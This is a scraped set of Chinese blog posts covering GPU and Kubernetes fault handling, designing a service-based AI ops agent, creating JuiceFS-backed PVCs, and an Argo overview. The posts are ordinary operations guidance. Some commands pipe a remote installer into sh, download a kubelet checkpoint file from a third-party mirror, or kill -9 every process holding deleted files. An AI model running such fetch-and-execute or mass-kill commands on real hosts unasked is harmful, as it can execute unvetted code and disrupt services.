版本不匹配。\n解决办法:\n加上环境变量，重启应用。\n1 LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/lib/x86_64-linux-gnu:/usr/local/nvidia/lib 5. 显存无法释放 执行命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 nvidia-smi +---------------------------------------------------------------------------------------+ | NVIDIA-SMI 535.104.05 Driver Version: 535.104.05 CUDA Version: 12.2 | |-----------------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |=========================================+======================+======================| | 0 NVIDIA A800-SXM4-80GB On | 00000000:10:00.0 Off | 0 | | N/A 32C P0 68W / 400W | 42058MiB / 81920MiB | 0% Default | | | | Disabled | +---------------------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=======================================================================================| +---------------------------------------------------------------------------------------+ 会看到没有进程使用显卡，但是显存依然被大量占用。\n同时可以发现有一批杀不死的僵尸进程。\n1 2 3 4 5 ps aux | grep -E \u0026#39;\\\u0026lt;defunct\\\u0026gt;\u0026#39; root 966461 0.0 0.0 6432 2488 pts/0 S+ 11:30 0:00 grep --color=auto -E \\\u0026lt;defunct\\\u0026gt; root 2215172 0.0 0.0 0 0 ? Zl Apr04 1:10 [python] \u0026lt;defunct\u0026gt; root 2215428 0.0 0.0 0 0 ? Zl Apr04 0:00 [python] \u0026lt;defunct\u0026gt; root 2215442 0.0 0.0 0 0 ? Zl Apr04 0:00 [python] \u0026lt;defunct\u0026gt; 解决办法:\n依次尝试重启 Kubelet、Docker、主机，即可释放显存资源\n6. Docker Hang 住，节点 NotReady 在 Kubelet 中看到 PLEG is not healthy 相关错误日志。在 Docker 中没有异常日志。\n可能是 runc hang 住了，因为 pipe 默认大小只有 64 MB，对于高性能计算场景不够用。\n解决办法：\n设置为 1GB，这里设置的是 262144 * 4K = 1GB\n1 echo \u0026#34;fs.pipe-user-pages-soft=262144\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf \u0026amp;\u0026amp; sysctl -p 7. df\\ls hang 住, 无法响应 查看 hang 住的进程\n1 2 3 strace df -h stat(\u0026#34;/data/kubelet/pods/af4c411c-bafa-4322-9a21-e5c60ab1658e/volumes/kubernetes.io~nfs/workspace-pv\u0026#34;, 找到相关的 mount point\n1 2 3 mount | grep mmt-10289-v2-1-4 1.1.1.1:/cfs-fSfmHNQjNA/workspace on /data/kubelet/pods/af4c411c-bafa-4322-9a21-e5c60ab1658e/volumes/kubernetes.io~nfs/workspace-pv type nfs (ro,relatime,vers=3,rsize=131072,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,mountaddr=10.8.254.230,mountvers=3,mountport=300,mountproto=tcp,local_lock=none,addr=10.8.254.230) 确认目录已经不可使用\n1 ls /data/kubelet/pods/af4c411c-bafa-4322-9a21-e5c60ab1658e/volumes/kubernetes.io~nfs/workspace-pv 此时应该 hang 住无法响应。通常是远端服务 1.1.1.1 已经无法访问，但挂载的客户端未清理导致。\n强行卸载目录\n1 umount -f /data/kubelet/pods/af4c411c-bafa-4322-9a21-e5c60ab1658e/volumes/kubernetes.io~nfs/workspace-pv 8. 磁盘 df 与 du 数据严重不符 使用 df 查看发现 / 使用了 86%。\n1 2 3 4 df -h Filesystem Size Used Avail Use% Mounted on /dev/sda3 435G 352G 62G 86% / 但使用 df 统计却只有很少使用量\n1 2 3 du -h --max-depth=2 --exclude=/data --exclude=/data1 --exclude=/var/lib/juicefs/volume / | grep \u0026#39;[0-9.]\\+G\u0026#39; 32G\t/ 原因是，删除大文件时，依然有程序占用文件，导致内核无法回收空间。\n解决办法:\n找出程序占用的文件 1 lsof -n | grep deleted 删除程序占用的文件 1 lsof -n | grep deleted | awk \u0026#39;{print $2}\u0026#39; | sort -u | xargs sudo kill -9 9. 使用 ipmitool 重启主机 使用 reboot 命令重启主机，只是系统层面，有些硬件故障不能恢复。\n1 ipmitool chassis power cycle 相当于断电重启。\n10. version mismatch 1 2 3 4 nvidia-smi Failed to initialize NVML: Driver/library version mismatch NVML library version: 535.129 1 2 3 4 5 modinfo nvidia | grep version version: 535.183.01 srcversion: E1D7E062E93D47A443165F6 vermagic: 5.4.0-1131-oracle SMP mod_unload modversions 解决办法：\n卸载 nvidia driver 之后，重新安装\n1 2 3 apt-get --purge remove \u0026#34;*cublas*\u0026#34; \u0026#34;cuda*\u0026#34; apt-get --purge remove \u0026#34;*nvidia*\u0026#34; apt autoremove 11. no free node 使用 https://github.com/tkestack/gpu-manager 对 GPU 进行管理，需要注意驱动的版本不能太高，比如 535.183 无法兼容。\n我们测试的可兼容版本是 535.129。\n使用高版本驱动时，显存分配之后，无法正常回收，导致第一次分配完成之后，新 Pod 创建时会报错 no free node。\n根本原因在于，gpu-manager 无法获取到实时的显存信息。\n在兼容的版本下如果遇到这个问题，可以尝试重启 kubelet，更新显存信息。\n12. 企业版 JuiceFS 速度剧烈波动 在预热之后，访问速度应该能够平稳、较快，但如果 P2P 缓存服务节点组中，有访问慢的节点，会导致访问速度局部下降，拉低整体的访问速度。\n可以进入 fluid 的 worker pod。\n1 2 3 ps aux | grep jfsmount root 190 47.8 0.0 6160996 397776 ? S\u0026lt;l Sep13 673:59 /usr/local/juicefs/mount/jfsmount myjuicefs-storage /runtime-mnt/juicefs/mynamespace/myjuicefs-storage-fluid/juicefs-fuse -o cache-group=mynamespace-myjuicefs-storage-fluid,cache-size=5242880,free-space-ratio=0.1,cache-dir=/data1/jfs/cache:/data/jfs/cache,foreground,no-update 查看 P2P 缓存服务节点组之间的连接\n1 lsof -p 190 排查是否有慢、不符合预期的节点，剔除相关节点即可恢复。\n13. resolv.conf: no such file or directory Pod 起不来，报错:\n1 /run/systemd/resolve/resolv.conf: no such file or directory 解决办法:\n1 vim /var/lib/kubelet/kubeadm-flags.env 在 KUBELET_KUBEADM_ARGS 中修改 --resolv-conf=/etc/resolv.conf。\n然后重启 kubelet:\n1 2 systemctl daemon-reload systemctl restart kubelet 14. 升级节点 CPU 之后 kubelet 起不来 报错信息\n1 start cpu manager error: current set of available CPUs \\\u0026#34;0-7\\\u0026#34; doesn\u0026#39;t match with CPUs in state \\\u0026#34;0-3\\\u0026#34; 解决办法:\n1 2 3 rm -f /var/lib/kubelet/cpu_manager_state systemctl daemon-reload systemctl restart kubelet 15. gpu-manager 启动报错 can\u0026rsquo;t load container response data 报错信息\n1 can\u0026#39;t load container response data, \u0026amp;json.SyntaxError{msg:\u0026#34;unexpected end of JSON input\u0026#34;, Offset:0} 有时也会提示找不到 kubelet_internal_checkpoint 类似错误。\n解决办法:\n尝试多重启几次 Kubelet，如果还是不行就从其他节点拷贝 /var/lib/kubelet/device-plugins/kubelet_internal_checkpoint 文件到当前节点。\n故障的原因是 GPU Manager 有 Bug，导致有时会无法生成 kubelet_internal_checkpoint 文件。\n1 wget https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/refs/heads/main/ai/kubelet_internal_checkpoint -O /var/lib/kubelet/device-plugins/kubelet_internal_checkpoint 16. cannot allocate unhealthy devices tencent.com/vcuda-core 无法创建 Pod gpu manager 报错\n1 E1114 03:01:12.308213 33781 server.go:133] Unable to set Type=notify in systemd service file? 解决办法:\n1 systemctl restart kubelet 17. DCGM 报错 Failed to watch metrics 报错信息\n1 Failed to watch metrics: Error watching fields: Host engine is running as non-root 解决办法:\n编辑 dcgm-exporter 的 DaemonSet，确认 Pod 的以下配置无误。\n1 2 3 4 5 6 securityContext: capabilities: add: - SYS_ADMIN runAsNonRoot: false runAsUser: 0 特别是这里的 capabilities 配置，确保有 SYS_ADMIN 权限，仅仅 runAsUser: 0 还不够。\n18. PCI 识别不到 GPU 执行命令:\n1 echo 1 \u0026gt; /sys/bus/pci/rescan 尝重新识别 PCI 设备，不一定能解决问题，因为有可能是硬件问题。\n19. 分配不足一整张卡时报错 rpc client exit with 255 报错提示\n1 /tmp/cuda-control/src/register.c:87 rpc client exit with 255 解决办法:\n添加环境变量\n1 LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/lib/x86_64-linux-gnu:/usr/local/nvidia/lib 原因是 CUDA 默认是不支持分配不足一整张卡的，需要 GPU 分片的组件支持。如果使用的是 GPU Manager，可以通过设置上面的环境变量劫持分配请求。\n20. drain 禁用指定的故障卡 查看卡的 PCI 位置 1 2 3 4 nvidia-smi --query-gpu=index,pci.bus_id --format=csv index, pci.bus_id 0, 00000000:18:00.0 第一列是卡的编号，第二列是卡的 PCI 位置。\n禁用指定的 GPU 卡 1 nvidia-smi drain -p 0000:18:00.0 -m 1 -m 1 表示驱逐状态，-m 0 表示关闭驱逐状态。执行完成之后，卡在 nvidia-smi 不可见，但在 lspci 中可见。\n查看卡的驱逐状态 1 nvidia-smi drain -p 0000:18:00.0 -q 21. NCCL Cannot allocate memory 报错提示，无法分配显存\nmisc/ibvwrap.cc:262 NCCL WARN Call to ibv_reg_mr failed with error Cannot allocate memory\n解决办法:\n给 Pod 添加上 IPC_LOCK 权限\n1 2 3 4 securityContext: capabilities: add: - IPC_LOCK 22. DNS 慢或者节点网络不通 现象是 DNS 解析慢，或者节点网络不通。抓包可以看到以下类似的错误:\n1 2 3 4 5 6 7 tcpdump -i bond1 host x.x.x.x -vvv 13:42:16.465143 IP (tos 0xc0, ttl 64, id 50859, offset 0, flags [DF], proto TCP (6), length 71) x.x.x.x.bgp \u0026gt; x.x.x.x57973: Flags [P.], cksum 0x7630 (correct), seq 590:609, ack 608, win 501, options [nop,nop,TS val 707951074 ecr 2196294139], length 19: BGP Keepalive Message (4), length: 19 13:42:16.465193 IP (tos 0xc0, ttl 64, id 62942, offset 0, flags [DF], proto TCP (6), length 52) x.x.x.x.57973 \u0026gt; x.x.x.x.bgp: Flags [.], cksum 0xe0be (incorrect -\u0026gt; 0x6c4f), seq 608, ack 609, win 501, options [nop,nop,TS val 2196297719 ecr 707951074], length 0 cksum 0xe0be (incorrect -\u0026gt; 0x6c4f) 表示校验和错误，导致网络有问题。\n解决办法，关闭 TSO 和 TX\n1 ethtool -K bond1 tso off tx off gso off gro off rx off 原因可能和网卡不支持上层的 Overlay 网络中的某种类型包的校验和计算有关。\n而且截止目前，只在 mellanox 的环境下碰到过，也可以试试升级相关的 firmware version。\n23. MPI No such file or directory 设置环境变量\n1 2 export LD_LIBRARY_PATH=/usr/local/mpi/lib:LD_LIBRARY_PATH export OPAL_PREFIX=/opt/hpcx/ompi/ 24. CUDA Error 802 1 ERROR 01-17 04:52:28 engine.py:366] RuntimeError: Unexpected error from cudaGetDeviceCount(). Did you run some cuda functions before calling NumCudaDevices() that might have already set an error? Error 802: system not yet initialized 在 A100 上遇到过，没有安装 nvidia-fabricmanager 服务，导致无法初始化。\n25. IB 网卡 Down 1 2 3 4 5 6 7 ibdev2netdev mlx5_0 port 1 ==\u0026gt; ibs10 (Up) mlx5_1 port 1 ==\u0026gt; ibs11 (Down) mlx5_4 port 1 ==\u0026gt; ibs18 (Up) mlx5_5 port 1 ==\u0026gt; ibs19 (Up) mlx5_bond_0 port 1 ==\u0026gt; bond1 (Up) 解决办法:\n查看日志\n1 2 3 cat /var/log/syslog |grep ibs11 ibs11: Lost carrier 这种情况通常是硬件问题，需要检查网线。\n当然也可以试试直接 UP 网卡\n1 ip link set ibs11 up 26. 安装 GPU 驱动执行 smi 卡死 有几种可能性:\n安装的驱动版本没有达到显卡的最低要求 安装的驱动版本与当前卡型不匹配 系统内核与驱动不兼容，需要升级内核 ","description":"","id":64,"section":"post","tags":["整理","GPU","AI","运维"],"title":"常用 GPU 运维及故障处理","uri":"https://www.chenshaowen.com/blog/common-gpu-operation-and-fault-handling.html"},{"content":"1. 不断尝试落地 AI 应用端 基于对运维的认知，我开发了一个开源的运维工具 https://github.com/shaowenchen/ops 。\nOps 工具将运维操作划分为脚本执行、文件分发两类，而运维对象主机和 Kubernetes 集群分别都实现了这两种运维操作。\nOps 对外提供的能力有，Ops Cli 命令行终端，Ops Server 服务端 API 接口，Ops Controller 集群端资源管理，还带有一个简易的 UI 界面，\n虽然半年前开发了 Ops Copilot，但其并没有发挥出 Ops 项目的能力，非常的独立，仅仅只是对接上了 LLM，能够提供一些对话、在本地自动执行脚本的能力而已。希望后面有机会借助这次 AI Agent 的技术路线重写 Ops Copilot。\n近期主要的工作目标就是基于 Ops 开发一个 AI Agent，自动化地完成一些运维操作。\n2. 找到一个可迭代的 AI Agent 技术路线很重要 AI Agent 是 AI 能够与物理世界直接进行交互的重要能力，是真正能够提高生产力，将人类从重复、机械的工作中解脱出来的关键技术。\nAI Agent 很美好，但这是站在技术消费者的角度。如果站在 AI Agent 开发者的角度，这件事聊起来就没那么轻松了:\n一个强烈的需求，最好能与工作内容匹配，能驱动你去开发 AI Agent 打磨 AI Agent 的场景，需要大量的使用场景打磨，不断优化实现 可迭代的技术路线 1 和 2 得看岗位的基本面，是否支持你去开发 AI Agent。3 是自己可控的，本篇也会着重介绍可迭代的 AI Agent 技术路线。\n我们在团队中引入新技术，从来都不会是一蹴而就，始终伴随着阶段性的汇报、阶段性的成果，风险的控制等。即使，你有好的想法和执行力，互联网团队也很难容忍太长时间的人力投入，而看不到任何效果。\n互联网产品的开发模式已经接受了敏捷开发的思路，需要不断地做出可用的产品，进行交付，拿到反馈，继续迭代。\n3. 什么是服务化的 AI Agent 服务化的 AI Agent 是我造的一个词，下面介绍一下这个词。\n3.1 AI Agent 与 Copilot 的区别 AI Agent 强调的是具有自主性，能够主动解决问题；而 Copilot 强调的是辅助、提供建议，需要人的引导。\n通过定位事项的主导者，可以很快区分两者。如果事项是程序主导负责，那么就是 AI Agent; 如果事项是人主导负责，那么就是 Copilot。\n3.2 服务化的 AI Agent 通常，大家聊的 AI Agent 是本地化的，也就是需要在被操作的设备上执行，甚至在必要时 AI Agent 能在本地部署 LLM 服务。\n如上图，服务化的 Agent 是以 API 的形式提供任务执行、环境感知的能力。\n比如，AI 端生成的 Python 脚本，需要调用 Agent 的 API 才能得到执行，然后返回执行结果。同样，如果需要获取 AI 当前的环境信息，也需要调用 Agent API 才能得到。\n当然你也可以采用多 Agent 的方式，如上图，每个 Agent 对接各自接管的操作对象，将环境的感知和执行能力保留在被操作的设备上。\n服务化的 AI Agent 具有以下优势：\n职责分离，Agent 只负责执行、感知，AI 只负责分析、聚合 执行环境更加灵活，可以基于资源、安全等因素配置不同的执行环境，比如集群操作的 Agent、GPU 操作的 Agent、云资源操作的 Agent 更容易对接已有的系统，可以每个系统开发一个 SideCar Agent 对接到 AI，而不是一个本地化的 AI Agent 集成全部系统 3.3 Ops 就是一个服务化的 Agent 端 Ops Server 的定位是通过 API 接口，能够执行 Ops 中内置的 Task 任务。这些 Task 任务都是一些敏感的运维操作。\n通过 Ops Server 的 API 接口，能够具备以下能力:\n感知:\nHost 主机列表 Kubernetes 集群信息 Host 内部能通过 Shell 获取的信息 Kubernetes 集群能通过 kubectl 获取的信息，以及各个节点能通过 Shell 获取的信息 执行:\nHost 主机操作 Kubernetes 集群 kubectl 操作，以及各个节点 Shell 操作 这些能力已经足够让 AI 完成大部分的运维任务了。\n4 开始写一个服务化的 AI Agent 4.1 抽象两个对象 如上图，服务化的 AI Agent 中\n驱动 AI 的对象是 Pipeline AI 端的一个 Pipeline 对应 Agent 端的多个 Task，这些 Task 通过一定顺序的排列组合、条件控制加上变量值，实现 Pipeline 的任务目标。\n驱动 Agent 的对象是 Task 在 Ops 中，我已经提供了一个 Task CRD 对象，内置了大量 Shell 脚本，用于收敛、复用运维的基本操作。\n4.2 使用 Task 封装 Agent 的基本操作 这是我们线上使用的部分运维 Task :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 kubectl -n ops-system get task NAME CRONTAB STARTTIME RUNSTATUS check-gpu-drop init check-node-existed init check-npu-drop init check-pod-existed 36m successed check-svc-existed init cordon-node init delete-pod 48m successed get-gpu-status init get-os-status init get-pod-error-logs-byname 36m successed get-pod-error-logs-bysvc 62m successed get-podlogs-byname init get-podlogs-bysvc init inspect-clusterip 120m successed list-clusters 45h failed list-error-events-bypod 36m successed list-error-events-bysvc 62m successed list-events-bypod init list-events-bysvc init list-nodes init list-pods init list-pods-abnormal init list-pods-bysvc 62m successed list-tasks 45h successed none-action init top-nodes-bycpu init top-nodes-bymem init top-pods-bycpu init top-pods-bycpu-node init top-pods-bymem init top-pods-bymem-node init uncordon-node init 增加新的 Task 只需要编写一个 Yaml 文件，开发一个新的 Task 非常容易。\n4.3 使用 Pipeline 对接业务场景 由于 Ops 中并没有抽象 Pipeline 的概念，我在 AI 端定义了 Pipeline 对象。\n针对每一个具体的场景，都可以编写一个 Pipeline，下面是一个示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var allPipelines = []ops.LLMPipeline{ pipelineGetClusterIP, } // 查看 cluster ip 详情 var pipelineGetClusterIP = ops.LLMPipeline{ Desc: \u0026#34;Query - 查看 cluster ip 详情\u0026#34;, Namespace: \u0026#34;ops-system\u0026#34;, Name: \u0026#34;get-cluster-ip\u0026#34;, NodeName: \u0026#34;anymaster\u0026#34;, Variables: []ops.VariablePair{ { Key: \u0026#34;clusterip\u0026#34;, Desc: \u0026#34;For example, `clusterip: 1.2.2.4`, 1.2.2.4 is clusterip\u0026#34;, Required: true, }, }, LLMTasks: []ops.LLMTask{ { Name: \u0026#34;inspect-clusterip\u0026#34;, }, { Name: \u0026#34;app-summary\u0026#34;, }, }, } 这里使用了两个 Task\ninspect-clusterip - 查询 cluster ip 详情，通过 API 调用，任务会下发到 Agent 执行 app-summary - 通过 LLM 总结输出的信息。 有两类 Task: 一种是实时从 Agent 获取的; 一种是 AI 端自定义的 Task，这是为了封装一些与 Ops 无关的任务，当然也可以再开发一个 Agent 执行此类任务。\n4.4 AI 端的开发 通常 AI Agent 是一个死循环的进程，不断地处理预期的数据，然后制定计划、执行计划、反省及再次制定计划，周而复始，直到解决问题。\n但这种处理方式比较耗 Token，而且项目开发的早期，Prompt、Task、环境感知都没有准备完善，很难有好的效果。因此，主要分为以下几个迭代阶段:\n实现预设场景的 AI Agent 辅助能力 针对特定场景，具有固定的上下文，确定的输入，我们开发 AI Agent 的目标会非常明确，容易拿到好的结果。同时，也是为了我们能够沉淀相关的 Task 能力，调试 Prompt 。\n通过向量库、周边系统，召回关键信息 可以预见的是，随着场景接入数量的剧增，每次需要给 LLM 提供的 Pipeline 描述、集群、主机信息会越来越多，会遇到以下问题：\n超长的文本会降低识别执行哪条 Pipeline 的准确性 缺少足够上下文及反馈，导致 AI Agent 无法解决问题、验证问题是否解决 此时就需要与输入更相关、更多的数据，将 Pipeline 的相关信息、执行结果、依赖的周边系统信息召回。让 AI Agent 根据这些信息，自主的执行 Pipeline，拿到结果，继续执行直至达到终止条件。\n自主唤醒 不再需要人工 at 唤醒，而是 AI Agent 能自动捕获关键信息，自动唤醒。从技术上这一点并不难，难点只在于，AI Agent 是否已经准备好，能够适应全量的场景。\n通过 at 唤醒只能覆盖一部分场景，但如果让 AI Agent 自动唤醒，需要考虑的细节、边界，就会比较多。\nAI 自主编写 Pipeline AI Agent 通过输入，自主检索向量库，拿到相关的 Task 和上下文信息，编写出 Pipeline、甚至新的 Task。此时，AI Agent 才达到了理想状态。\n4.5 看看我实现的效果 目前按照上面的思路，我完成到 1 的阶段，但 2、3、4 在技术上是可行，需要时间迭代。\n重启一个 Pod 查看一个告警信息的详情 基本实现了 Pipeline 与 Task 的对接，能够处理一些基本的运维场景，值得注意的是，新的场景接入成本特别低。只需要复用或者新增 Task，注册到 allTasks，编排 Pipeline 注册到 allPipelines 就能添加新的场景。\n5. 对齐是开发 AI Agent 的巨大挑战 可能不止是开发 AI Agent，所有 LLM 的应用场景都会遇到对齐的问题。\n5.1 怎么有效提取关键信息 AI 端在运行 Pipeline 时，需要命中 Pipeline 并提取相关运行参数。为此需要在 Pipeline 中:\n详细描述 Pipeline 的用途 1 2 3 var pipelineGrafanaAlertPodErrorRequest = ops.LLMPipeline{ Desc: \u0026#34;Analysis - Grafana告警Pod异常请求比例大于10%\u0026#34;, } Desc 能够让 LLM 准确识别 Pipeline 的用途。\n详细描述变量含义、格式特征等 1 2 3 4 5 6 7 8 9 type VariablePair struct { Key string Value UniversalValue Desc string Regx string ExampleValue UniversalValue DefaultValue UniversalValue Required bool } 变量的提取不准是一个常见的问题，需要对依赖的变量进行详细描述。这些描述信息包括，变量的描述、正则表达式、示例值、默认值、是否必填等，特征越多越明显，LLM 越容易做出正确的判断。\n为了让 AI 端能够正确识别操作的集群对象，我甚至直接将动态获取的 Cluster 列表提交给了 LLM。\n1 2 3 4 5 6 7 8 9 10 11 12 parmerters := jsonschema.Definition{ Type: \u0026#34;object\u0026#34;, Properties: map[string]jsonschema.Definition{ \u0026#34;nameRef\u0026#34;: { Type: \u0026#34;string\u0026#34;, Description: m.GetClusterManager().BuildtMarkdown(), Enum: m.GetClusterManager().GetList(), }, }, Required: []string{\u0026#34;nameRef\u0026#34;}, } } 5.2 Retry 依然有效 一个月我写了三、四个版本的 AI Agent。第一个版本 AI 直接对接到 Task，没有抽象 Pipeline，效果还行，但经常会出现这样的状况。\n如上图，LLM 有时并不会输出我想要的 Json 格式数据，而是直接输出了一个 Plan 计划。而符合预期的响应应该是 LLM 返回一段 Json 数据，然后 Agent 执行这些 Task，返回给用户最终的结果。如下图是一个符合预期的示例:\n因此 Retry 重试依然是有效解决对齐问题的关键方法之一。当 LLM 不理解你的意图时，你只需要重试一次。当 LLM 不能有效提取关键信息，你只需要重试一次。当 LLM 无法给出预期的结果时，你只需要重试一次。\n在执行 Pipeline 时，程序出现了非预期的状态，重试基本都能立即改善最终的响应结果。\n5.3 Reflection\\Reward 能提高准确率 同样是 Retry 循环，如果能加上一点反馈或者奖励，也能提高 LLM 与场景意图的对齐能力。\n在 https://blog.langchain.dev/reflection-agents/ 中有相关的描述，如下图:\n我们只需要检查 Pipeline 的状态是否符合预期，提出自己的要求、对某些关键状态进行检查，给出评价，再次给 LLM 重试即可。\n5.4 数据的预选 前面我已经提到，当接入大量场景之后，必然会触发 LLM 单词处理的 Token 上限，同时，长文本也会削弱 LLM 的信息提取能力。\n进行数据的预选，能够避免这些问题，将问题缩小在输入相关的信息上。\n如上图，需要预选的数据类型可能会有很多，比如:\n执行模板，Pipeline 、Task 模板 上下文，当前输入相关的领域信息，运维相关的就是 Metrics、Logs、Events 等信息，当然也可以通过 Task 实时查询 团队人员相关的，比如应用的负责人 权限信息，当执行 Permission Task 时，需要校验用户的权限 知识库，这里就需要用到向量数据库进行召回 一些示例、成功的 Case，以供 LLM 做 few-shot learning 6. 总结 本篇主要是我在最近开发 AI Agent 应用的一些总结，主要内容如下:\n在团队中落地 AI Agent 应用，找到可迭代的技术路线很重要，有利于汇报和阶段性的展示成果。\n介绍了一种服务化 AI Agent 的设计思路，将 AI Agent 拆分为 AI 端负责分析，Agent 端负责执行，他两者通过 API 交互。服务化的 AI Agent 有利于现有系统的集成，避免 AI Agent 集成全部系统。\n介绍了一个开发服务化 AI Agent 的迭代思路，AI 端使用 Pipeline 对象，Agent 端使用 Task 对象，首先通过内置的 Pipeline 对齐具体场景，通过向量检索提升大规模实践下的精准度，然后让 AI Agent 自主唤醒接入全量场景，最后让 LLM 自主编排 Pipeline 完成任务。\n介绍了几种解决在开发 AI Agent 应用时对齐问题的方法，包括准确的功能、字段描述，Retry 机制，Reflection\\Reward 机制，数据预选。\n纸上得来终觉浅，绝知此事要躬行。只有当自己真正动手写 AI Agent 解决实际问题时，才发现原来有这么多坑，谨以此文记录。\n","description":"","id":65,"section":"post","tags":["博文","思考","AI","Agent","LLM","Ops"],"title":"用了一个月，终于找到点写 AI Agent 的思路","uri":"https://www.chenshaowen.com/blog/provide-a-way-to-develop-ai-agent.html"},{"content":" 本篇主要记录创建 JuiceFS PVC 的脚本，方便快速配置。组件部署可以参考 使用 Fluid 和 JuiceFS 在 Kubernetes 管理数据 。\n1. 设置环境变量 桶的配置 1 2 3 4 5 6 export ACCESS_KEY= export SECRET_KEY= export BUCKET= export ENDPOINT=ks3-cn-beijing-internal.ksyun.com export BUCKET_ENPOINT=$BUCKET.$ENDPOINT export PROVIDER=ks3 Workload 的配置 1 2 3 4 5 export NAMESPACE= export PVC_NAME= export NODE_SELECTOR_KEY= export NODE_SELECTOR_VALUE= 镜像的配置 export JUICEFS_IMAGE=juicedata/juicefs-fuse export DEMO_IMAGE=shaowenchen/demo-ubuntu 元数据的配置 如果是 Redis 配置\n1 2 3 4 export REDIS_PASSWORD= #ip:port/database export REDIS_ENDPOINT= export META_SERVER=redis://:$REDIS_PASSWORD@$REDIS_ENDPOINT 如果是 PostgreSQL 配置\n1 2 3 4 5 6 export POSTGRES_USER=admin export POSTGRES_PASSWORD= export POSTGRES_IP= export POSTGRES_PORT=5432 export POSTGRES_DB= export META_SERVER=postgres://$POSTGRES_USER:$POSTGRES_PASSWORD@$POSTGRES_IP:$POSTGRES_PORT/$POSTGRES_DB?sslmode=disable 1 psql -U $POSTGRES_USER -h $POSTGRES_IP -p $POSTGRES_PORT -d postgres -c \u0026#34;CREATE DATABASE $POSTGRES_DB;\u0026#34; 2. 初始化 JuiceFS 1 2 3 4 5 6 juicefs format \\ --trash-days=1 \\ --storage $PROVIDER \\ --bucket $BUCKET_ENPOINT \\ $META_SERVER \\ $BUCKET trash-days 为 0 表示禁用回收站。\n3. 创建 Secret 1 2 3 4 5 6 7 8 9 10 11 12 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Secret metadata: name: $PVC_NAME namespace: $NAMESPACE type: Opaque stringData: metaurl: $META_SERVER access-key: $ACCESS_KEY secret-key: $SECRET_KEY EOF 4. 创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: $PVC_NAME namespace: $NAMESPACE spec: accessModes: - ReadWriteMany mounts: - name: $BUCKET mountPoint: \u0026#34;juicefs:///\u0026#34; options: bucket: $BUCKET_ENPOINT storage: $PROVIDER cache-group: $NAMESPACE-$PVC_NAME max-uploads: \u0026#34;120\u0026#34; opencache: \u0026#34;\u0026#34; encryptOptions: - name: metaurl valueFrom: secretKeyRef: name: $PVC_NAME key: metaurl - name: access-key valueFrom: secretKeyRef: name: $PVC_NAME key: access-key - name: secret-key valueFrom: secretKeyRef: name: $PVC_NAME key: secret-key EOF 5. 创建 JuiceFSRuntime 注意修改 nodeSelector，因为 worker 会占用大量资源。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: JuiceFSRuntime metadata: name: $PVC_NAME namespace: $NAMESPACE spec: replicas: 1 juicefsVersion: image: $JUICEFS_IMAGE imageTag: ce-v1.1.0 fuse: image: $JUICEFS_IMAGE imageTag: ce-v1.1.0 cleanPolicy: OnDemand worker: nodeSelector: $NODE_SELECTOR_KEY: \u0026#34;$NODE_SELECTOR_VALUE\u0026#34; resources: limits: cpu: 15 memory: 100Gi requests: cpu: 1 memory: 10Gi tieredstore: levels: - mediumtype: SSD path: /data/jfs/cache quota: 40960 # 40GiB low: \u0026#34;0.1\u0026#34; EOF 如果是企业版的 JuiceFS 可以在 fuse 和 worker 部分配置 cache-group。\n1 2 options: \u0026#34;cache-group\u0026#34;: \u0026#34;$PVC_NAME\u0026#34; 需要注意，对于同一个高速网络下的节点，才能用同一个 cache-group。\n6. 创建测试 Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: $PVC_NAME namespace: $NAMESPACE spec: containers: - name: demo image: $DEMO_IMAGE volumeMounts: - mountPath: /data/jfs name: data nodeSelector: $NODE_SELECTOR_KEY: \u0026#34;$NODE_SELECTOR_VALUE\u0026#34; volumes: - name: data persistentVolumeClaim: claimName: $PVC_NAME EOF 7. 性能测试 1 kubectl -n $NAMESPACE exec -it $PVC_NAME -- bash 1 cd /data/jfs 1 curl -sSL https://d.juicefs.com/install | sh - 1 juicefs bench ./ ","description":"","id":66,"section":"post","tags":["博文","AI","存储","JuiceFS"],"title":"在 Kubernetes 下创建后端为 JuiceFS 的 PVC","uri":"https://www.chenshaowen.com/blog/how-to-quickly-create-juicefs-pvc-in-kubernetes.html"},{"content":"1. argo 介绍 Argo 是一个开源项目，它在 Kubernetes 上提供了一系列工具，用于构建和运行应用程序。Argo 的核心组件主要包括以下几个：\nArgo CD Argo CD 是一个基于 GitOps 的持续交付工具，它允许用户声明式地管理 Kubernetes 集群中的应用部署。Argo CD 通过与 Git 仓库同步，确保集群状态与 Git 仓库中定义的状态保持一致。\nArgo Workflows 这是一个基于容器的任务编排工具，它允许用户定义、运行和监控复杂的工作流。Argo Workflows 支持多种类型的工作流，包括顺序、并行、条件和循环等。\nArgo Events 这是一个事件驱动工具，它提供了一种机制来处理来自外部系统的事件，并触发 Kubernetes 集群内的操作。Argo Events 包括事件源（EventSources）、事件总线（EventBus）、传感器（Sensors）和触发器（Triggers）等组件。\nArgo Rollouts Argo Rollouts 是一个应用渐进式发布工具，它支持金丝雀发布、蓝绿发布等策略，帮助用户安全地更新和回滚 Kubernetes 